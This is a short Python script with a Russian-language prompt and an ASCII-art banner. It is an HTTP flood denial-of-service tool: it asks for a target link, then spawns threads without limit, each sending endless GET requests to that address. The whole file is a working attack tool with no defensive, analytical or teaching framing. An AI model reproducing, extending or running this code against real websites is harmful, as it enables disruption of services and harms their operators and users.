import threading
import requests
import os


COLOR_CODE = {
    "GREEN": "\033[0;32m",
    "RESET": "\033[0m",
}

os.system("cls")
print(f'''{COLOR_CODE["GREEN"]}                           
                                                                                 
                                                                                 
                                                                                     
                                                                                     
        ,----,                        ,----,                             
      ,/   .`|     ,----..          ,/   .`|                      ____   
    ,`   .'  :    /   /   \       ,`   .'  :     ,---,.         ,'  , `. 
  ;    ;     /   /   .     :    ;    ;     /   ,'  .' |      ,-+-,.' _ | 
.'___,/    ,'   .   /   ;.  \ .'___,/    ,'  ,---.'   |   ,-+-. ;   , || 
|    :     |   .   ;   /  ` ; |    :     |   |   |   .'  ,--.'|'   |  ;| 
;    |.';  ;   ;   |  ; \ ; | ;    |.';  ;   :   :  |-, |   |  ,', |  ': 
`----'  |  |   |   :  | ; | ' `----'  |  |   :   |  ;/| |   | /  | |  || 
    '   :  ;   .   |  ' ' ' :     '   :  ;   |   :   .' '   | :  | :  |, 
    |   |  '   '   ;  \; /  |     |   |  '   |   |  |-, ;   . |  ; |--'  
    '   :  |    \   \  ',  /      '   :  |   '   :  ;/| |   : |  | ,     
    ;   |.'      ;   :    /       ;   |.'    |   |    \ |   : '  |/      
    '---'         \   \ .'        '---'      |   :   .' ;   | |`-'       
                   `---`                     |   | ,'   |   ;/           
                                             `----'     '---'        
                                                                                                                            
                                                                                         
      ''')  
link = input(f'{COLOR_CODE["GREEN"]}[$] Введите ссылку: ')
def dos():
 while True:
  requests.get(link)
  
while True:
 threading.Thread(target=dos).start()